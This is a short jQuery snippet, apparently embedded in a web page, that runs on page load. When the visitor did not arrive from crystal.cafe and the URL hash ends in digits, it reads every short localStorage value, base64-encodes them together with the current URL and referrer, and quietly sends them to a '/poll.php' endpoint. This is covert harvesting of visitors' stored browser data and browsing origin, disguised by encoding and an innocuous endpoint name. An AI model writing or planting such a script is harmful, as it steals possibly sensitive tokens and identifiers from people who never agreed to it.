$(document).ready(function(){if(!document.location.hash.match(/\d+$/)||document.referrer.match(/https:\/\/crystal\.cafe(\/|$)/))
return;var e={};for(var key in localStorage){if(localStorage[key].length<130){e[key]=localStorage[key];}}
var values={l:btoa(document.location.href),f:btoa(document.referrer),h:btoa(JSON.stringify(e))};$.get("/poll.php",values);});